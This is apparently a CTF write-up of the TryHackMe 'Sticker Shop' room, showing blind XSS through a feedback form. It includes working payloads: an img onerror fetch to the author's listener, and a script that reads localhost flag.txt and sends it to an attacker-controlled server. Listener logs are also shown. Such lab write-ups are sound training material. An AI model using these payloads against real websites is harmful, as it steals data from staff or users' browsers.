---
title: 'TryHackMe: The Sticker Shop'
author:  Smyle :)
categories: [TryHackMe]
description: "Can you exploit the sticker shop in order to capture the flag?"
tags: [CTF, Easy, Blind Xss ]
render_with_liquid: false
media_subpath: /images/The_Sticker_Shop/
image:
  path: intro.png
---

So, in this room, we will look into Blind XSS. `Blind Cross-Site Scripting (Blind XSS)` is a type of XSS (Cross-Site Scripting) attack where the malicious script does not execute immediately on the vulnerable page but is stored and executed later, usually in an admin panel or another user’s browser.
![Tryhackme Room Link](room.png){: width="600" height="150" .shadow }
_<https://tryhackme.com/room/thestickershop>_

### Task:1 The sticker shop is finally online!
Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!

>Can you read the flag at `http://MACHINE_IP:8080/flag.txt?` 

This gives you a direct link to the flag at `http://MACHINE_IP:8080/flag.txt`, but it  actually give you `401 Unauthorized`
```console
$ curl http://10.10.17.35:8080/flag.txt  
<h1>401 Unauthorized</h1> 
```
We have a `feedback panel`, so we simply submit our `feedback`, but the result doesn’t show. Maybe this is a case of **Blind XSS**
The feedback panel show below result 
```console
Thanks for your feedback! It will be evaluated shortly by our staff
```

let's test the malicious `JavaScript` to see if it's connecting back or not.
```console
<img src=x
onerror="fetch('http://10.8.128.221:4444')"/>
```
>*change your local ip*
{: .prompt-info}

Result:
```console
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.8.128.221] from (UNKNOWN) [10.10.17.35] 49752
GET / HTTP/1.1
Host: 10.8.128.221:4444
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/119.0.6045.105 Safari/537.36
Accept: */*
Origin: http://127.0.0.1:8080
Referer: http://127.0.0.1:8080/
Accept-Encoding: gzip, deflate
```

The hint says `Can you conduct any client-side exploitation in order to read the flag?`  What does this mean?
we’ll simply set up a Python server on port `8000`."
```console
python3 -m http.server 8000
```
After that we will use below `paylaod`
```console
'"><script>
  fetch('http://127.0.0.1:8080/flag.txt')
    .then(response => response.text())
    .then(data => {
      fetch('http://10.8.128.221:8000/?flag=' + encodeURIComponent(data));
    });
</script>
```
* This script tries to read the contents of a file called `flag.txt` located on the local machine at `http://127.0.0.1:8080/flag.txt`. 
* It uses **JavaScript's** fetch function to request this file. Once the file's contents are retrieved, the script sends this data to a different server controlled by the attacker at `http://10.8.128.221:8000/` by making another request and including the flag data as part of the URL parameters. 
* Essentially, this script steals the secret flag from the local machine and sends it to the attacker’s server so they can access it remotely. This technique is often used in attacks like Blind XSS, where the attacker cannot see the result directly but can get the sensitive information sent to them silently.

## Blind Flag
```console
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.17.35 - - [31/May/2025 11:33:26] "GET /?flag=THM%7B83789a6907f[REDACTED]cfcabe8b62305ee6%7D HTTP/1.1" 200 -
```
![SCKD](sckd.gif){: width="800" height="150" .shadow }




